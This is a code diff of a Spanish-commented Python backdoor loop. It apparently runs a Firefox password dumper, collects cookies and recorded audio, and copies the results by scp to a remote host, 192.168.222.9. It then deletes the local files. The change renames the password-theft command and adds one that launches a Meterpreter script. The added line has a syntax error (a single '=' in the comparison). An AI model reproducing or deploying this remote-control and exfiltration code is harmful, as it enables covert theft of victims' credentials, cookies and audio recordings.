@@ -47,7 +47,7 @@ while True:
                 os.system('rm -f /tmp/cookies.txt')
                 connstream.send("Archivo enviado")
 
-    elif recibido == "contrasenas":
+    elif recibido == "contra":
        		os.system("python firepass.py")
                 os.system('scp /tmp/firepass.txt manavi@192.168.222.9:~/contrasenas 1>/dev/null')
                 os.system('rm -f /tmp/firepass.txt')
@@ -80,7 +80,12 @@ while True:
                 capaudio.audio(mo.group(1))
                 os.system('scp /tmp/*.wav manavi@192.168.222.9:~/audio 1>/dev/null')
                 os.system('rm -f /tmp/*.wav')
-        	connstream.send("Archivo enviado")
+        		connstream.send("Archivo enviado")
+
+    elif recibido = "meterpreter":
+                
+        		os.system("python meterpreter6666.py")
+        		connstream.send("Meterpreter Ejecutado")
 
     #Devolvemos el mensaje de error al cliente
     else :
